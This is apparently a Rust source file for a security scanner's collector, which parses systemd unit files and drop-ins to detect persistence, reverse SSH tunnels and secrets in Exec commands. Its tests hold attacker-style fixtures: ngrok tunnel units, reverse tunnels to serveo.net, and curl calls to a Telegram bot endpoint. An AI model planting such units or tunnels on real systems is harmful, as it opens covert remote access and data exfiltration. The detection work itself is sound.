use super::Collector;
use crate::homefs::HomeFile;
use crate::models::Fact;
use serde_json::Value;
use std::collections::HashSet;
use std::path::{Path, PathBuf};

pub struct SystemdUnitsCollector;

/// The folders systemd loads system units from, highest priority first (`systemd.unit(5)`): the
/// administrator's, the runtime one that `systemd-run` writes to, and the two packages install
/// into. A unit name found in an earlier folder replaces the same name in a later one, and
/// drop-ins from every folder apply. The first version of this collector read only the first two,
/// so a unit dropped into `/usr/lib/systemd/system` or `/usr/local/lib/systemd/system` — where it
/// runs exactly the same — was never looked at.
const SYSTEM_UNIT_DIRS: &[&str] = &[
    "/etc/systemd/system",
    "/run/systemd/system",
    "/usr/local/lib/systemd/system",
    "/usr/lib/systemd/system",
    "/lib/systemd/system",
];

/// System-wide folders for per-user units (they start for every user who logs in).
const GLOBAL_USER_UNIT_DIRS: &[&str] = &[
    "/etc/systemd/user",
    "/run/systemd/user",
    "/usr/local/lib/systemd/user",
    "/usr/lib/systemd/user",
];

/// A user's own unit folders, relative to the home folder. These need no root at all.
const HOME_UNIT_DIRS: &[&str] = &[".config/systemd/user", ".local/share/systemd/user"];

/// Unit file extensions that can carry an `Exec…=` line and therefore an attacker payload.
/// `.service` is the obvious one; the timer/socket/path activation units all reach a service too,
/// but a payload can sit directly on a socket's `ExecStartPre=` as well.
const UNIT_EXTENSIONS: &[&str] = &["service", "timer", "socket", "path"];

/// Settings that start with `Exec` and are not a command.
const NOT_A_COMMAND: &[&str] = &["ExecSearchPath", "ExecPaths"];

/// What one unit file (or drop-in) says, as far as the persistence rules need it.
#[derive(Debug, Default, PartialEq, Eq)]
struct UnitSettings {
    /// Every command of every `Exec…=` setting, in file order, as written (not yet masked).
    commands: Vec<String>,
    has_install_section: bool,
}

/// Reads unit-file text per `systemd.syntax(7)`: `Key=Value` with blanks around the `=` ignored,
/// `#` and `;` comment lines, a line ending in a backslash continued on the next (comment lines
/// inside a continuation are skipped), and an empty assignment clearing what the same key held
/// before. Matching the literal prefix `ExecStart=` missed `ExecStart = …`, a continued command,
/// and every other `Exec…=` setting.
fn parse_unit_text(text: &str) -> UnitSettings {
    let mut settings = UnitSettings::default();
    // (key, value) in order, so an empty assignment can clear the earlier ones of that key.
    let mut execs: Vec<(String, String)> = Vec::new();
    let mut pending: Option<String> = None;
    for raw in text.lines() {
        let line = raw.trim();
        let is_comment = line.starts_with('#') || line.starts_with(';');
        let logical = match pending.take() {
            Some(mut joined) => {
                if is_comment {
                    pending = Some(joined);
                    continue;
                }
                joined.push_str(line);
                joined
            }
            None => {
                if line.is_empty() || is_comment {
                    continue;
                }
                line.to_string()
            }
        };
        if let Some(head) = logical.strip_suffix('\\') {
            // "the backslash is replaced by a space character"
            pending = Some(format!("{} ", head.trim_end()));
            continue;
        }
        record(&logical, &mut settings, &mut execs);
    }
    if let Some(rest) = pending {
        record(rest.trim(), &mut settings, &mut execs);
    }
    settings.commands = execs.into_iter().map(|(_, v)| v).collect();
    settings
}

fn record(line: &str, settings: &mut UnitSettings, execs: &mut Vec<(String, String)>) {
    if line.starts_with('[') {
        if line == "[Install]" {
            settings.has_install_section = true;
        }
        return;
    }
    let Some((key, value)) = line.split_once('=') else {
        return;
    };
    let (key, value) = (key.trim(), value.trim());
    if key == "WantedBy" || key == "RequiredBy" || key == "Also" || key == "Alias" {
        settings.has_install_section = true;
        return;
    }
    if !key.starts_with("Exec") || NOT_A_COMMAND.contains(&key) {
        return;
    }
    if value.is_empty() {
        // `ExecStart=` on its own resets the list (how a drop-in replaces a command).
        execs.retain(|(k, _)| k != key);
        return;
    }
    // The executable may carry prefixes that change how it is started, not what it is:
    // `@`, `-`, `:`, `+`, `!`, `!!`, `|` (`systemd.service(5)`).
    let command = value.trim_start_matches(['@', '-', ':', '+', '!', '|']);
    execs.push((key.to_string(), command.trim_start().to_string()));
}

/// Whether a command starts an SSH reverse tunnel: `ssh` (or `autossh`) with `-R` anywhere among
/// its options (`ssh -N -R 2222:localhost:22 host`, `ssh -fNR …`, `-R2222:…`) or
/// `-o RemoteForward=…`. A pattern for the literal text `ssh -R` missed all but the first, and a
/// looser one would have matched `rsync -R -e ssh`, where `-R` is rsync's.
fn is_reverse_ssh_tunnel(command: &str) -> bool {
    let tokens: Vec<&str> = command
        .split_whitespace()
        .map(|t| t.trim_matches(['"', '\'', '(', ')', ';']))
        .collect();
    let mut i = 0;
    while i < tokens.len() {
        let name = tokens[i].rsplit('/').next().unwrap_or_default();
        // `rsync -e ssh`, `git -c core.sshCommand=ssh`: ssh named as an argument, not run here.
        let is_argument = i > 0 && matches!(tokens[i - 1], "-e" | "--rsh" | "-c");
        if matches!(name, "ssh" | "autossh") && !is_argument {
            for arg in &tokens[i + 1..] {
                // The command ends where the shell starts another one.
                if matches!(*arg, "|" | "||" | "&&" | "&" | "") {
                    break;
                }
                let cluster_with_r = arg.starts_with('-')
                    && !arg.starts_with("--")
                    && arg[1..]
                        .chars()
                        .take_while(|c| c.is_ascii_alphanumeric())
                        .any(|c| c == 'R')
                    // `-o`, `-i`, `-F`, `-E`… take an argument glued on; only a cluster of plain
                    // switches may hide an R (`-fNR`, `-NTR`).
                    && arg[1..]
                        .chars()
                        .take_while(|c| *c != 'R')
                        .all(|c| "46AaCfGgKkMNnqsTtVvXxYy".contains(c));
                if cluster_with_r || arg.to_ascii_lowercase().contains("remoteforward") {
                    return true;
                }
            }
        }
        i += 1;
    }
    false
}

/// The fact row for one unit file or drop-in: its name, every command it runs (masked, joined so
/// one rule condition scans them all), whether any is an SSH reverse tunnel, and whether it has an
/// `[Install]` section. Secrets are masked here, at the collector boundary, so no credential
/// reaches a finding or the database (see [`super::cmdline`]).
pub fn parse_unit_file(unit_name: &str, text: &str) -> Fact {
    let settings = parse_unit_text(text);
    let mut fact = Fact::new();
    fact.insert(
        "unit_name".to_string(),
        Value::String(unit_name.to_string()),
    );
    // The tool names the rules match on (ngrok, cloudflared, curl, the messaging hosts) are not
    // secrets and survive masking untouched, so detection is unaffected.
    let masked: Vec<String> = settings
        .commands
        .iter()
        .map(|c| super::cmdline::mask_command_line(c))
        .collect();
    fact.insert("exec_start".to_string(), Value::String(masked.join(" ; ")));
    fact.insert(
        "reverse_ssh_tunnel".to_string(),
        Value::Bool(settings.commands.iter().any(|c| is_reverse_ssh_tunnel(c))),
    );
    fact.insert(
        "has_install_section".to_string(),
        Value::Bool(settings.has_install_section),
    );
    fact
}

fn has_unit_extension(name: &str) -> bool {
    Path::new(name)
        .extension()
        .and_then(|e| e.to_str())
        .is_some_and(|e| UNIT_EXTENSIONS.contains(&e))
}

/// The folder `<unit>.d` that holds a unit's drop-ins (`x.service.d`, and the type-wide
/// `service.d`).
fn is_dropin_dir(name: &str) -> bool {
    name.strip_suffix(".d")
        .is_some_and(|unit| has_unit_extension(unit) || UNIT_EXTENSIONS.contains(&unit))
}

fn sorted_names(dir: &Path) -> Vec<String> {
    let mut names: Vec<String> = std::fs::read_dir(dir)
        .map(|it| {
            it.flatten()
                .filter_map(|e| e.file_name().into_string().ok())
                .collect()
        })
        .unwrap_or_default();
    names.sort();
    names
}

/// Whether an already-resolved path is inside one of the root-owned unit folders.
fn in_system_unit_dir(real: &Path) -> bool {
    SYSTEM_UNIT_DIRS
        .iter()
        .chain(GLOBAL_USER_UNIT_DIRS)
        .any(|dir| {
            real.starts_with(dir) || std::fs::canonicalize(dir).is_ok_and(|d| real.starts_with(d))
        })
}

/// One set of unit folders searched in priority order (the system ones, or one user's).
struct Search<'a> {
    /// Set for folders inside a home folder: every file is then opened under the rules of
    /// [`crate::homefs`], because its owner controls each name in it.
    home: Option<&'a Path>,
    /// Unit names already taken by an earlier folder; a later copy is not loaded by systemd.
    names: HashSet<String>,
    /// Files already read, by real path: `/lib` is usually a link to `/usr/lib`, and an alias such
    /// as `dbus-org.freedesktop.x.service` is a link to the unit beside it.
    files: HashSet<PathBuf>,
    rows: Vec<Fact>,
}

impl Search<'_> {
    fn read(&mut self, path: &Path) -> Option<String> {
        // A link to /dev/null masks the unit, and a link to nowhere is what a removed package
        // leaves behind. Neither has anything to run, so neither is an error. (Returning an error
        // for the second once blinded the whole rule family on one stale link.)
        if let Ok(target) = std::fs::read_link(path) {
            if target == Path::new("/dev/null") || std::fs::metadata(path).is_err() {
                return None;
            }
        }
        let real = std::fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf());
        // In a user's folder, a link to a packaged unit is how `systemctl --user enable` records
        // an alias (`pipewire-session-manager.service` -> `/usr/lib/systemd/user/wireplumber.service`
        // on most desktops). That unit belongs to root and is read where it lives, so the link
        // is neither followed out of the home folder nor reported as unreadable.
        if self.home.is_some() && in_system_unit_dir(&real) {
            return None;
        }
        if !self.files.insert(real) {
            return None;
        }
        let read = match self.home {
            Some(home) => super::read_home(home, path),
            None => super::read_system(path),
        };
        match read {
            HomeFile::Found(read) => {
                if read.truncated {
                    self.rows.push(super::unread_row(path, super::TOO_LARGE));
                }
                Some(read.text)
            }
            HomeFile::Missing => None,
            HomeFile::Refused => {
                let reason = match self.home {
                    Some(_) => crate::homefs::REFUSED,
                    None => super::refused_reason(path),
                };
                self.rows.push(super::unread_row(path, reason));
                None
            }
        }
    }

    fn dir(&mut self, dir: &Path) {
        // A folder that doesn't exist (no /run units, no user units) is nothing to read.
        for name in sorted_names(dir) {
            let path = dir.join(&name);
            if has_unit_extension(&name) {
                // Decide by name before reading, so a masked or replaced unit in an earlier
                // folder hides the packaged one of the same name, as it does for systemd.
                if !self.names.insert(name.clone()) {
                    continue;
                }
                if let Some(text) = self.read(&path) {
                    self.rows.push(parse_unit_file(&name, &text));
                }
            } else if is_dropin_dir(&name) {
                for conf in sorted_names(&path) {
                    if !conf.ends_with(".conf") {
                        continue;
                    }
                    if let Some(text) = self.read(&path.join(&conf)) {
                        let row = parse_unit_file(&format!("{name}/{conf}"), &text);
                        // Most drop-ins only set an environment variable or a limit; a row is
                        // worth keeping when it runs something.
                        if row["exec_start"].as_str().is_some_and(|c| !c.is_empty()) {
                            self.rows.push(row);
                        }
                    }
                }
            }
        }
    }
}

/// Rows for every unit and command-carrying drop-in in `dirs`, searched in the order given.
fn collect_dirs(dirs: &[PathBuf], home: Option<&Path>) -> Vec<Fact> {
    let mut search = Search {
        home,
        names: HashSet::new(),
        files: HashSet::new(),
        rows: Vec::new(),
    };
    for dir in dirs {
        search.dir(dir);
    }
    search.rows
}

fn paths(dirs: &[&str]) -> Vec<PathBuf> {
    dirs.iter().map(PathBuf::from).collect()
}

impl Collector for SystemdUnitsCollector {
    fn name(&self) -> &'static str {
        "systemd_units"
    }

    fn is_applicable(&self) -> bool {
        SYSTEM_UNIT_DIRS
            .iter()
            .chain(GLOBAL_USER_UNIT_DIRS)
            .any(|d| Path::new(d).is_dir())
            || super::user_homes()
                .iter()
                .any(|h| HOME_UNIT_DIRS.iter().any(|d| h.join(d).is_dir()))
    }

    fn collect(&self) -> anyhow::Result<Vec<Fact>> {
        let mut rows = collect_dirs(&paths(SYSTEM_UNIT_DIRS), None);
        rows.extend(collect_dirs(&paths(GLOBAL_USER_UNIT_DIRS), None));
        // Each user's own units: `$HOME`, and under sudo or pkexec the invoking user's too.
        for home in super::user_homes() {
            let dirs: Vec<PathBuf> = HOME_UNIT_DIRS.iter().map(|d| home.join(d)).collect();
            rows.extend(collect_dirs(&dirs, Some(&home)));
        }
        Ok(rows)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn exec(text: &str) -> String {
        parse_unit_file("x.service", text)["exec_start"]
            .as_str()
            .unwrap()
            .to_string()
    }

    fn write(dir: &Path, rel: &str, text: &str) {
        let path = dir.join(rel);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }

    fn unit_names(rows: &[Fact]) -> Vec<&str> {
        rows.iter()
            .filter_map(|r| r.get("unit_name")?.as_str())
            .collect()
    }

    #[test]
    fn extracts_exec_start_and_post() {
        let text = "[Unit]\nDescription=x\n[Service]\nExecStart=/usr/bin/ngrok tcp 22\nExecStartPost=/bin/bash -c 'curl https://api.telegram.org'\n[Install]\nWantedBy=multi-user.target\n";
        let fact = parse_unit_file("ngrok-ssh.service", text);
        let exec = fact.get("exec_start").unwrap().as_str().unwrap();
        assert!(exec.contains("ngrok"));
        assert!(exec.contains("curl"));
        assert_eq!(fact.get("has_install_section").unwrap(), &Value::Bool(true));
    }

    #[test]
    fn every_way_systemd_reads_a_command_is_read() {
        // Each of these runs ngrok as far as systemd is concerned (systemd.syntax(7),
        // systemd.service(5)); the old `strip_prefix("ExecStart=")` saw only the first.
        for text in [
            "[Service]\nExecStart=/usr/local/bin/ngrok tcp 22\n",
            "[Service]\nExecStart = /usr/local/bin/ngrok tcp 22\n",
            "[Service]\n  ExecStart\t=\t/usr/local/bin/ngrok tcp 22\n",
            "[Service]\nExecStart=/bin/true\nExecStartPre=/usr/local/bin/ngrok tcp 22\n",
            "[Service]\nExecStart=/bin/true\nExecStop=/usr/local/bin/ngrok tcp 22\n",
            "[Service]\nExecStart=/bin/true\nExecStopPost=-/usr/local/bin/ngrok tcp 22\n",
            "[Service]\nExecStart=/bin/true\nExecReload=/usr/local/bin/ngrok tcp 22\n",
            "[Service]\nExecStart=/bin/true\nExecCondition=/usr/local/bin/ngrok tcp 22\n",
            "[Service]\nExecStart=/bin/sh -c \\\n  # a comment inside the continuation\n  '/usr/local/bin/ngrok \\\n   tcp 22'\n",
            "[Service]\nExecStart=-@+/usr/local/bin/ngrok tcp 22\n",
            "[Service]\nExecStart=/bin/true\nExecStart=\nExecStart=/usr/local/bin/ngrok tcp 22\n",
        ] {
            assert!(exec(text).contains("/usr/local/bin/ngrok"), "{text:?}");
            assert!(exec(text).contains("tcp 22"), "{text:?}");
        }
    }

    #[test]
    fn what_is_not_a_command_is_not_read_as_one() {
        for text in [
            "[Service]\n# ExecStart=/usr/local/bin/ngrok tcp 22\nExecStart=/bin/true\n",
            "[Service]\n; ExecStart=/usr/local/bin/ngrok tcp 22\nExecStart=/bin/true\n",
            "[Unit]\nDescription=ExecStart=/usr/local/bin/ngrok\n[Service]\nExecStart=/bin/true\n",
            "[Service]\nExecSearchPath=/opt/ngrok/bin\nExecStart=/bin/true\n",
            "[Service]\nEnvironment=TUNNEL=ngrok\nExecStart=/bin/true\n",
            // Cleared by a later empty assignment: systemd no longer runs it.
            "[Service]\nExecStart=/usr/local/bin/ngrok tcp 22\nExecStart=\nExecStart=/bin/true\n",
        ] {
            assert_eq!(exec(text), "/bin/true", "{text:?}");
        }
    }

    #[test]
    fn reverse_ssh_tunnels_are_recognised_among_other_flags() {
        for cmd in [
            "/usr/bin/ssh -R 2222:localhost:22 u@h",
            "/usr/bin/ssh -N -R 2222:localhost:22 u@h",
            "/usr/bin/ssh -fNT -o ServerAliveInterval=30 -R 2222:localhost:22 u@h",
            "/usr/bin/ssh -NR 2222:localhost:22 u@h",
            "/usr/bin/ssh -R2222:localhost:22 u@h",
            "/usr/bin/autossh -M 0 -N -R 2222:localhost:22 u@h",
            "/usr/bin/ssh -N -o RemoteForward=2222 localhost:22 u@h",
            "/bin/sh -c 'exec ssh -N -R 80:localhost:3000 serveo.net'",
        ] {
            assert!(is_reverse_ssh_tunnel(cmd), "{cmd}");
            let fact = parse_unit_file("t.service", &format!("[Service]\nExecStart={cmd}\n"));
            assert_eq!(fact["reverse_ssh_tunnel"], Value::Bool(true), "{cmd}");
        }
        for cmd in [
            "/usr/sbin/sshd -D $SSHD_OPTS",
            "/usr/bin/ssh -N -L 8080:localhost:80 u@h",
            "/usr/bin/ssh -i /root/.ssh/Release_key u@h /usr/local/bin/sync",
            "/usr/bin/ssh -o RequestTTY=no u@h backup",
            "/usr/bin/rsync -aR -e ssh /srv/ backup@h:/srv/",
            "/usr/bin/rsync -e ssh -R /srv/ backup@h:/srv/",
            "/usr/bin/scp -r /srv u@h:/srv",
            "/usr/bin/ssh u@h true && /usr/bin/ls -R /srv",
            "/usr/bin/ssh-keygen -R host.example",
            "/usr/bin/ssh-agent -D -a /run/agent.sock",
        ] {
            assert!(!is_reverse_ssh_tunnel(cmd), "{cmd}");
        }
    }

    #[test]
    fn drop_ins_and_every_unit_folder_are_read_in_priority_order() {
        let tmp = tempfile::tempdir().unwrap();
        let (etc, usr) = (tmp.path().join("etc"), tmp.path().join("usr"));
        let ngrok = "[Service]\nExecStart=/usr/local/bin/ngrok tcp 22\n";
        // A drop-in that adds a command to an innocent unit.
        write(&etc, "web.service", "[Service]\nExecStart=/usr/bin/web\n");
        write(&etc, "web.service.d/override.conf", ngrok);
        // A drop-in that only sets a limit is not worth a row.
        write(
            &etc,
            "web.service.d/limits.conf",
            "[Service]\nLimitNOFILE=65536\n",
        );
        // A type-wide drop-in applies to every service.
        write(
            &etc,
            "service.d/all.conf",
            "[Service]\nExecStartPre=/usr/local/bin/ngrok http 80\n",
        );
        // Not a drop-in folder, and not a .conf: neither is read by systemd.
        write(&etc, "multi-user.target.wants/readme.conf", ngrok);
        write(&etc, "web.service.d/override.conf.bak", ngrok);
        // A packaged unit, and one the administrator replaced with a harmless copy.
        write(&usr, "tunnel.service", ngrok);
        write(&usr, "replaced.service", ngrok);
        write(&etc, "replaced.service", "[Service]\nExecStart=/bin/true\n");

        let rows = collect_dirs(&[etc, usr], None);
        let ngrok_units: Vec<&str> = rows
            .iter()
            .filter(|r| r["exec_start"].as_str().unwrap().contains("ngrok"))
            .map(|r| r["unit_name"].as_str().unwrap())
            .collect();
        assert_eq!(
            ngrok_units,
            [
                "service.d/all.conf",
                "web.service.d/override.conf",
                "tunnel.service"
            ]
        );
        assert!(!unit_names(&rows).contains(&"web.service.d/limits.conf"));
    }

    #[cfg(unix)]
    #[test]
    fn a_dangling_or_masking_link_hides_nothing_beside_it() {
        // A purged package leaves a dangling `.service` link, and an attacker's unit sits in the
        // same folder. The collector once stopped at the dangling link and returned nothing, so
        // the whole persistence rule family went silent.
        let tmp = tempfile::tempdir().unwrap();
        let (etc, usr) = (tmp.path().join("etc"), tmp.path().join("usr"));
        std::fs::create_dir_all(&etc).unwrap();
        std::os::unix::fs::symlink(etc.join("does-not-exist"), etc.join("purged.service")).unwrap();
        std::os::unix::fs::symlink("/dev/null", etc.join("masked.service")).unwrap();
        let ngrok =
            "[Service]\nExecStart=/usr/bin/ngrok tcp 22\n[Install]\nWantedBy=multi-user.target\n";
        write(&etc, "evil.service", ngrok);
        // Masked in /etc: the packaged unit of that name never runs, so it is not reported.
        write(&usr, "masked.service", ngrok);
        // An alias link to a unit beside it is the same unit, reported once.
        write(&usr, "real.service", ngrok);
        std::os::unix::fs::symlink(usr.join("real.service"), usr.join("alias.service")).unwrap();

        let rows = collect_dirs(&[etc, usr], None);
        assert!(
            rows.iter()
                .all(|r| !r.contains_key(crate::homefs::COULD_NOT_READ)),
            "a stale or masking link is not an error: {rows:?}"
        );
        let mut names = unit_names(&rows);
        names.sort();
        assert_eq!(names.len(), 2, "{names:?}");
        assert_eq!(
            names[0], "alias.service",
            "first of the two names, read once"
        );
        assert_eq!(names[1], "evil.service");
    }

    #[test]
    fn tokens_in_a_command_never_reach_the_row() {
        // The exact leaks reported: an ngrok authtoken and a Telegram bot token, copied verbatim
        // into the finding and the database. Built at run time so no secret-shaped text is
        // committed.
        let authtoken = format!(
            "{}{}",
            "2aBcD3eFgH4iJkL5mNoP6qRsT", "_7uVwX8yZaB9cDeF0gHiJ1k"
        );
        let bot = format!("{}:{}", "1234567890", "AAHk3mN8vB4cR9tY6wL1pD3fH5jS0aGzQ7x");
        let text = format!(
            "[Service]\nExecStart=/usr/local/bin/ngrok tcp 22 --authtoken {authtoken}\n\
             ExecStartPost=/usr/bin/curl -s https://api.telegram.org/bot{bot}/sendMessage -d chat_id=1 -d text=up\n\
             ExecStopPost=/usr/bin/curl -H \"Authorization: Bearer {authtoken}\" https://deploy:{authtoken}@hooks.example.com/x\n"
        );
        let fact = parse_unit_file("t.service", &text);
        let kept = serde_json::to_string(&fact).unwrap();
        for secret in [
            authtoken.as_str(),
            bot.as_str(),
            &authtoken[..14],
            &bot[11..25],
        ] {
            assert!(!kept.contains(secret), "{secret} leaked: {kept}");
        }
        let exec = fact["exec_start"].as_str().unwrap();
        // What the rules match on, and what tells a person which unit this is, is still there.
        assert!(exec.contains("/usr/local/bin/ngrok tcp 22 --authtoken "));
        assert!(exec.contains("curl -s https://api.telegram.org/…"));
        assert!(exec.contains("https://hooks.example.com/…"));
    }

    #[test]
    fn the_cloudflared_connector_token_is_redacted_out_of_exec_start() {
        // `cloudflared service install` writes a unit whose ExecStart carries the live connector
        // token. The tool name must survive (so the rule still matches) while the token must not.
        let text = "[Service]\nExecStart=/usr/bin/cloudflared --no-autoupdate tunnel run --token eyJhIjoiZm9vIiwidCI6ImJhciIsInMiOiJiYXoifQ.sig.more\n[Install]\nWantedBy=multi-user.target\n";
        let fact = parse_unit_file("cloudflared.service", text);
        let kept = fact.get("exec_start").unwrap().as_str().unwrap();
        assert!(
            kept.contains("cloudflared"),
            "the tool name must remain for detection"
        );
        assert!(
            kept.contains("tunnel run"),
            "the command shape stays legible"
        );
        assert!(
            !kept.contains("eyJhIjoiZm9vIiwidCI6ImJhciIsInMiOiJiYXoifQ"),
            "the connector token must NOT appear: {kept}"
        );

        // And a `--password=value` inline form.
        let text2 = "[Service]\nExecStart=/opt/app --password=Tr0ub4dorAndMore3xKeep --host db\n";
        let exec2 = exec(text2);
        assert!(
            !exec2.contains("Tr0ub4dorAndMore3xKeep"),
            "inline secret leaked: {exec2}"
        );
        assert!(exec2.contains("--host db"), "non-secret args stay intact");
    }

    #[test]
    fn timer_socket_and_path_units_are_scanned_too() {
        // A payload can ride an activation unit, not just a `.service`.
        for ext in ["timer", "socket", "path"] {
            assert!(has_unit_extension(&format!("x.{ext}")));
            assert!(is_dropin_dir(&format!("x.{ext}.d")));
        }
        assert!(is_dropin_dir("service.d"));
        assert!(!is_dropin_dir("multi-user.target.wants"));
        assert!(!has_unit_extension("x.target"));
    }

    #[cfg(unix)]
    #[test]
    fn a_user_folder_link_to_a_packaged_unit_is_not_reported_but_one_elsewhere_is() {
        let home = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        let dir = home.path().join(".config/systemd/user");
        std::fs::create_dir_all(&dir).unwrap();
        // What `systemctl --user enable` leaves for a unit with an Alias=. The target need not
        // exist on the machine running the test: a link into a system unit folder is skipped
        // whether or not it resolves.
        std::os::unix::fs::symlink(
            "/usr/lib/systemd/user/wireplumber.service",
            dir.join("pipewire-session-manager.service"),
        )
        .unwrap();
        // A link to a file somewhere else outside the home folder is not followed, and says so.
        std::fs::write(
            outside.path().join("t.service"),
            "[Service]\nExecStart=/usr/local/bin/ngrok tcp 22\n",
        )
        .unwrap();
        std::os::unix::fs::symlink(outside.path().join("t.service"), dir.join("t.service"))
            .unwrap();
        let rows = collect_dirs(std::slice::from_ref(&dir), Some(home.path()));
        let unread: Vec<&str> = rows
            .iter()
            .filter(|r| r.contains_key(crate::homefs::COULD_NOT_READ))
            .filter_map(|r| r["path"].as_str())
            .collect();
        assert_eq!(
            unread,
            [dir.join("t.service").to_str().unwrap()],
            "{rows:?}"
        );
        assert!(unit_names(&rows).is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn a_pipe_or_an_oversized_unit_in_a_home_folder_is_reported_not_waited_on() {
        let home = tempfile::tempdir().unwrap();
        let dir = home.path().join(".config/systemd/user");
        std::fs::create_dir_all(&dir).unwrap();
        let fifo = dir.join("x.service");
        let c = std::ffi::CString::new(fifo.to_str().unwrap()).unwrap();
        // SAFETY: a valid NUL-terminated path and a plain mode.
        assert_eq!(unsafe { libc::mkfifo(c.as_ptr(), 0o600) }, 0);
        // 4.3 MB of comments before the command: the unread part must not read as "nothing here".
        let mut big = "# padding padding padding padding\n".repeat(130_000);
        big.push_str("[Service]\nExecStart=/usr/local/bin/ngrok tcp 22\n");
        std::fs::write(dir.join("big.service"), big).unwrap();
        std::fs::write(
            dir.join("ok.service"),
            "[Service]\nExecStart=/usr/bin/true\n",
        )
        .unwrap();

        let (tx, rx) = std::sync::mpsc::channel();
        let (home_path, dirs) = (home.path().to_path_buf(), vec![dir.clone()]);
        std::thread::spawn(move || {
            let _ = tx.send(collect_dirs(&dirs, Some(&home_path)));
        });
        let rows = rx
            .recv_timeout(std::time::Duration::from_secs(20))
            .expect("a pipe in ~/.config/systemd/user must not block the scan");
        let unread: Vec<(String, &str)> = rows
            .iter()
            .filter_map(|r| {
                Some((
                    r.get("path")?.as_str()?.to_string(),
                    r.get(crate::homefs::COULD_NOT_READ)?.as_str()?,
                ))
            })
            .collect();
        assert!(unread.contains(&(fifo.display().to_string(), crate::homefs::REFUSED)));
        assert!(unread.contains(&(
            dir.join("big.service").display().to_string(),
            crate::collectors::TOO_LARGE
        )));
        // The unit beside them is still read.
        assert!(unit_names(&rows).contains(&"ok.service"));
    }
}
